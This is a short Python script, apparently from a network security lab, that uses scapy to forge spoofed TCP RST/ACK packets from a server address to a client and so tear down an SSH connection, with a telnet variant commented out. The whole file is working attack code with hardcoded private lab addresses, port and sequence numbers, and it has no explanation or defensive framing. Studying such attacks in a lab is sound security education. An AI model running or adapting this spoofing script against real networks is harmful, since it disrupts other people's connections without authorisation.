#!/usr/bin/python3

from scapy.all import *

# TCP RST attack
# Send the TCP RST packet from server to client
server_IP = "10.0.2.4"
client_IP = "10.0.2.6"

telnet_PORT = 23
SSH_PORT = 22
target_PORT = 55006

RA_flag = "RA"

seq_num = 2385340575
ack_num = 1623159222

# Setup IP packet
ip = IP(src=server_IP, dst=client_IP)

# TCP packet with RA flag
#tcp1 = TCP(sport=telnet_PORT, dport=target_PORT, flags=RA_flag, seq=seq_num, ack=ack_num)
tcp1 = TCP(sport=SSH_PORT, dport=target_PORT, flags=RA_flag, seq=seq_num, ack=ack_num)

# TCP packet with RA flag and increment the SEQ & ACK number
#tcp2 = TCP(sport=telnet_PORT, dport=target_PORT, flags=RA_flag, seq=seq_num+1, ack=ack_num+1)
tcp2 = TCP(sport=SSH_PORT, dport=target_PORT, flags=RA_flag, seq=seq_num+1, ack=ack_num+1)

# Send RST, ACK packet
pkt1 = ip/tcp1
pkt2 = ip/tcp2

# Send first packet
ls(pkt1)
send(pkt1, verbose=0)

# Send second packet
ls(pkt2)
send(pkt2, verbose=0)
